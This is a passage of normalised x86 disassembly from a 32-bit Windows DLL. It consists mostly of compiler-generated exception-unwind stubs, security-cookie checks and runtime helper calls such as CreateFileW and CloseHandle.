push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a146
add esp 0x10
pop ebp
retn
sub_1001a33e
push 0x1
call sub_10017add
pop ecx
retn
sub_1001a499
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10019a85
pop ecx
pop ecx
retn
sub_1001a4c8
push 0x1
call sub_10017add
pop ecx
retn
sub_1001a4d1
push 0x1
call sub_1001a3f7
pop ecx
retn
sub_1001a4da
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_1001a4f9
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_1001a5e9
push esi
call sub_10019a49
pop ecx
retn
sub_1001a6c2
push ebx
call sub_1001a0dd
pop ecx
retn
sub_1001a822
push ebx
call sub_1001a0dd
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1001afda
mov [ ecx ] r--data
jmp sub_10012864
sub_1001b138
push [ ebp - 0x14 ]
call sub_1001b06b
pop ecx
retn
sub_1001b17c
call sub_1001565c
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1001565c
dec [ eax + 0x90 ]
sub_1001b21e
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1001b227
mov esp [ ebp - 0x18 ]
call sub_10018004
sub_1001b2d4
push 0x4
mov eax sub_1001d8d3
call sub_1001bd0c
call sub_1001565c
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1001803d
call sub_10018050
sub_1001b3ad
mov eax [ ebp - 0x14 ]
call sub_1001b196
retn
sub_1001b624
xor eax eax
inc eax
retn
sub_1001b628
mov esp [ ebp - 0x18 ]
call sub_10018004
sub_1001b6bd
xor eax eax
inc eax
retn
sub_1001b6c1
mov esp [ ebp - 0x18 ]
call sub_10018004
sub_1001bbb4
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10012896
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001bd42
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_1001bd60
mov eax [ ebp + 0x8 ]
jmp sub_1000f190
sub_1001bd68
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bd90
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bdb0
lea ecx [ ebp - 0x18 ]
jmp sub_1000ff10
sub_1001bdb8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bde0
lea esi [ ebp - 0x20 ]
jmp sub_1000a360
sub_1001bde8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001be10
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001be30
lea eax [ ebp - 0x60 ]
jmp sub_10009270
sub_1001be38
lea eax [ ebp - 0x5c ]
jmp sub_10009270
sub_1001be40
lea eax [ ebp - 0x58 ]
jmp sub_10009270
sub_1001be48
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x74 ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001be70
mov ecx [ ebp + 0x8 ]
jmp sub_10004e80
sub_1001be78
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_1000a360
sub_1001be83
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bea0
lea eax [ ebp - 0x1c ]
jmp sub_10003980
sub_1001bea8
lea eax [ ebp - 0x30 ]
jmp sub_10003980
sub_1001beb0
lea eax [ ebp - 0x2c ]
jmp sub_10003980
sub_1001beb8
lea eax [ ebp - 0x38 ]
jmp sub_10003980
sub_1001bec0
lea eax [ ebp - 0x18 ]
jmp sub_10003980
sub_1001bec8
lea eax [ ebp - 0x34 ]
jmp sub_10003990
sub_1001bed0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bef0
mov ecx [ ebp - 0x10 ]
jmp sub_10004e80
sub_1001bef8
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_1000a360
sub_1001bf03
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bf20
lea eax [ ebp - 0x124 ]
jmp sub_10003990
sub_1001bf2b
lea eax [ ebp - 0x12c ]
jmp sub_10003990
sub_1001bf36
lea eax [ ebp - 0x128 ]
jmp sub_10003980
sub_1001bf41
lea eax [ ebp - 0x130 ]
jmp sub_10003980
sub_1001bf4c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x134 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bf80
mov ecx [ ebp - 0x10 ]
jmp sub_10009260
sub_1001bf88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bfb0
mov ecx [ ebp + 0x8 ]
jmp sub_10009260
sub_1001bfb8
lea eax [ ebp - 0x1c ]
jmp sub_10003980
sub_1001bfc0
lea eax [ ebp - 0x20 ]
jmp sub_10003980
sub_1001bfc8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001bff0
mov eax [ ebp - 0x14 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001bffb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c020
mov ecx [ ebp - 0x10 ]
jmp sub_10009b90
sub_1001c028
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c050
mov eax [ ebp - 0x94 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c05e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c090
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c09b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c0c0
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_1000a360
sub_1001c0cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c0f0
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_1000a360
sub_1001c0fb
lea eax [ ebp - 0x1c ]
jmp sub_10003980
sub_1001c103
lea eax [ ebp - 0x20 ]
jmp sub_10003980
sub_1001c10b
lea eax [ ebp - 0x24 ]
jmp sub_10003980
sub_1001c113
lea eax [ ebp - 0x28 ]
jmp sub_10003980
sub_1001c11b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c140
mov ecx [ ebp - 0x10 ]
jmp sub_10004e80
sub_1001c148
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c170
mov ecx [ ebp + 0x8 ]
jmp sub_10004e80
sub_1001c178
mov eax [ ebp - 0x18 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c183
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c1a0
mov eax [ ebp - 0x14 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c1ab
mov ecx [ ebp - 0x14 ]
jmp sub_10007e40
sub_1001c1b3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c1d0
mov eax [ ebp + 0x8 ]
add eax 0x18
jmp sub_10003f70
sub_1001c1db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c200
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c220
mov esi [ ebp + 0x8 ]
jmp sub_1000a360
sub_1001c228
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c250
mov eax [ ebp - 0x10 ]
jmp sub_100010d0
sub_1001c258
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c280
mov ecx [ ebp - 0x10 ]
jmp sub_10009260
sub_1001c288
mov esi [ ebp - 0x10 ]
add esi 0x38
jmp sub_10002a30
sub_1001c293
mov esi [ ebp - 0x10 ]
add esi 0x54
jmp sub_10010690
sub_1001c29e
mov esi [ ebp - 0x10 ]
add esi 0x70
jmp sub_10010690
sub_1001c2a9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c2d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c2f0
mov ecx [ ebp - 0x10 ]
jmp sub_1000d390
sub_1001c2f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c320
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c340
mov ecx [ ebp + 0x8 ]
jmp sub_10009260
sub_1001c348
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c370
lea eax [ ebp - 0x18 ]
jmp sub_10003980
sub_1001c378
mov eax [ ebp - 0x14 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c383
mov ecx [ ebp - 0x14 ]
jmp sub_10009b90
sub_1001c38b
lea eax [ ebp - 0x14 ]
jmp sub_10003980
sub_1001c393
mov eax [ ebp - 0x18 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c39e
mov eax [ ebp - 0x18 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c3a9
mov ecx [ ebp - 0x18 ]
jmp sub_10009b90
sub_1001c3b1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c3d0
lea eax [ ebp - 0x18 ]
jmp sub_10003980
sub_1001c3d8
lea eax [ ebp - 0x1c ]
jmp sub_10003980
sub_1001c3e0
mov eax [ ebp - 0x20 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c3eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c410
mov ecx [ ebp - 0x10 ]
jmp sub_10009260
sub_1001c418
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_10002a30
sub_1001c423
mov esi [ ebp - 0x10 ]
add esi 0x20
jmp sub_10002a30
sub_1001c42e
mov esi [ ebp - 0x10 ]
add esi 0x3c
jmp sub_10002a30
sub_1001c439
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c460
mov ecx [ ebp - 0x34 ]
jmp sub_10009260
sub_1001c468
mov esi [ ebp - 0x34 ]
add esi 0x4
jmp sub_10002a30
sub_1001c473
mov esi [ ebp - 0x34 ]
add esi 0x20
jmp sub_10002a30
sub_1001c47e
mov esi [ ebp - 0x34 ]
add esi 0x3c
jmp sub_10002a30
sub_1001c489
lea eax [ ebp - 0x40 ]
jmp sub_10003980
sub_1001c491
lea eax [ ebp - 0x3c ]
jmp sub_10003990
sub_1001c499
lea eax [ ebp - 0x38 ]
jmp sub_10003980
sub_1001c4a1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c4d0
mov ecx [ ebp - 0x10 ]
jmp sub_100048c0
sub_1001c4d8
mov esi [ ebp - 0x10 ]
add esi 0x28
jmp sub_10002a30
sub_1001c4e3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c500
lea eax [ ebp - 0x34 ]
jmp sub_10003f70
sub_1001c508
lea eax [ ebp - 0x48 ]
jmp sub_10003f70
sub_1001c510
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c540
mov ecx [ ebp - 0x1b8 ]
jmp sub_10004e80
sub_1001c54b
mov esi [ ebp - 0x1b8 ]
add esi 0x14
jmp sub_1000a360
sub_1001c559
mov eax [ ebp - 0x1a8 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c567
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1b8 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c590
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c5b0
mov ecx [ ebp - 0x10 ]
jmp sub_10001370
sub_1001c5b8
mov eax [ ebp - 0x14 ]
jmp sub_10001ca0
sub_1001c5c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c5e0
mov eax [ ebp - 0x14 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c5eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c610
mov ecx [ ebp + 0x8 ]
jmp sub_10001370
sub_1001c618
mov eax [ ebp - 0x14 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c623
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c640
mov esi [ ebp - 0x18 ]
add esi 0x4
jmp sub_10002a30
sub_1001c64b
mov esi [ ebp - 0x18 ]
add esi 0x24
jmp sub_10002a30
sub_1001c656
mov eax [ ebp - 0x1c ]
jmp sub_1000f190
sub_1001c65e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c680
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_10002a30
sub_1001c68b
mov esi [ ebp - 0x10 ]
add esi 0x24
jmp sub_10002a30
sub_1001c696
mov eax [ ebp - 0x14 ]
jmp sub_1000f190
sub_1001c69e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c6c0
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c6cb
mov ecx [ ebp - 0x10 ]
jmp sub_10009b90
sub_1001c6d3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c6f0
mov eax [ ebp - 0x14 ]
push eax
call sub_100025d0
retn
sub_1001c6fa
mov eax [ ebp - 0x14 ]
add eax 0x148
jmp sub_10003f70
sub_1001c707
mov eax [ ebp - 0x14 ]
jmp sub_100010d0
sub_1001c70f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c730
mov eax [ ebp - 0x14 ]
push eax
call sub_100025d0
retn
sub_1001c73a
mov eax [ ebp - 0x14 ]
add eax 0x24
jmp sub_10003f70
sub_1001c745
mov eax [ ebp - 0x14 ]
jmp sub_100010d0
sub_1001c74d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c770
mov ecx [ ebp - 0x10 ]
jmp sub_10004e80
sub_1001c778
mov esi [ ebp - 0x10 ]
add esi 0x14
jmp sub_1000a360
sub_1001c783
mov eax [ ebp - 0x14 ]
jmp sub_10001ca0
sub_1001c78b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c7b0
lea esi [ ebp - 0x58 ]
jmp sub_10002a30
sub_1001c7b8
lea esi [ ebp - 0x3c ]
jmp sub_10002a30
sub_1001c7c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c7f0
mov eax [ ebp - 0x10 ]
push eax
call sub_100025d0
retn
sub_1001c7fa
mov esi [ ebp - 0x10 ]
add esi 0x10
jmp sub_10002a30
sub_1001c805
mov eax [ ebp - 0x10 ]
jmp sub_100010d0
sub_1001c80d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c830
mov eax [ ebp + 0x8 ]
jmp sub_100010d0
sub_1001c838
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c860
mov eax [ ebp + 0x8 ]
jmp sub_100010d0
sub_1001c868
mov ecx [ ebp + 0x8 ]
jmp sub_100010e0
sub_1001c870
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c890
mov eax [ ebp + 0x8 ]
jmp sub_10001ca0
sub_1001c898
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c8c0
mov eax [ ebp + 0x8 ]
jmp sub_100010d0
sub_1001c8c8
mov ecx [ ebp + 0x8 ]
jmp sub_100010e0
sub_1001c8d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c8f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c910
mov eax [ ebp + 0x8 ]
jmp sub_1000f190
sub_1001c918
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c940
mov eax [ ebp + 0x8 ]
push eax
call sub_100025d0
retn
sub_1001c94a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c970
lea eax [ ebp + 0xc ]
jmp sub_10003f70
sub_1001c978
mov eax [ ebp - 0x40 ]
push eax
call sub_100025d0
retn
sub_1001c982
mov eax [ ebp - 0x40 ]
add eax 0x148
jmp sub_10003f70
sub_1001c98f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c9c0
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001c9cb
mov ecx [ ebp - 0x14 ]
jmp sub_10003e60
sub_1001c9d3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001c9f0
lea eax [ ebp + 0x10 ]
jmp sub_10003f70
sub_1001c9f8
mov eax [ ebp + 0x8 ]
push eax
call sub_100025d0
retn
sub_1001ca02
mov eax [ ebp + 0x8 ]
add eax 0x24
jmp sub_10003f70
sub_1001ca0d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001ca30
lea esi [ ebp + 0x28 ]
jmp sub_10002a30
sub_1001ca38
lea esi [ ebp + 0x8 ]
jmp sub_10002a30
sub_1001ca40
mov ecx [ ebp - 0x10 ]
jmp sub_100048c0
sub_1001ca48
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_10002a30
sub_1001ca53
mov esi [ ebp - 0x10 ]
add esi 0x24
jmp sub_10002a30
sub_1001ca5e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001ca80
mov eax [ ebp - 0x10 ]
push eax
call sub_100025d0
retn
sub_1001ca8a
mov esi [ ebp - 0x10 ]
add esi 0x1c
jmp sub_10002a30
sub_1001ca95
mov esi [ ebp - 0x10 ]
add esi 0x38
jmp sub_10002a30
sub_1001caa0
mov eax [ ebp - 0x10 ]
jmp sub_100010d0
sub_1001caa8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cad0
mov eax [ ebp + 0x8 ]
push eax
call sub_100025d0
retn
sub_1001cada
mov esi [ ebp + 0x8 ]
add esi 0x10
jmp sub_10002a30
sub_1001cae5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cb00
mov eax [ ebp - 0x10 ]
push eax
call sub_100025d0
retn
sub_1001cb0a
mov esi [ ebp - 0x10 ]
add esi 0xc
jmp sub_10002a30
sub_1001cb15
mov eax [ ebp - 0x10 ]
jmp sub_100010d0
sub_1001cb1d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cb40
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001cb4b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cb70
lea esi [ ebp - 0x2c ]
jmp sub_10010690
sub_1001cb78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cba0
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001cba8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cbd0
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001cbd8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cc00
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_10002a30
sub_1001cc0b
mov esi [ ebp - 0x10 ]
add esi 0x24
jmp sub_10002a30
sub_1001cc16
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
j_sub_10011d00#6
jmp sub_10011d00
sub_1001cc45
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cc60
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_10002a30
sub_1001cc6b
mov esi [ ebp + 0x8 ]
add esi 0x24
jmp sub_10002a30
sub_1001cc76
mov eax [ ebp + 0x8 ]
add eax 0x40
push eax
call sub_1000efe0
retn
sub_1001cc83
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
j_sub_10011d00#4
jmp sub_10011d00
sub_1001cca5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001ccc0
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001cccb
mov ecx [ ebp - 0x10 ]
jmp sub_1000d390
sub_1001ccd3
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_1000e840
sub_1001ccde
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cd00
lea eax [ ebp + 0xc ]
jmp sub_10003f70
sub_1001cd08
mov eax [ ebp - 0x2c ]
add eax 0x18
jmp sub_10003f70
sub_1001cd13
lea ecx [ ebp - 0x24 ]
jmp sub_10003e60
sub_1001cd1b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cd40
lea eax [ ebp + 0xc ]
jmp sub_10003f70
sub_1001cd48
mov eax [ ebp - 0x14 ]
push eax
call sub_100025d0
retn
sub_1001cd52
mov esi [ ebp - 0x14 ]
add esi 0xc
jmp sub_10002a30
sub_1001cd5d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
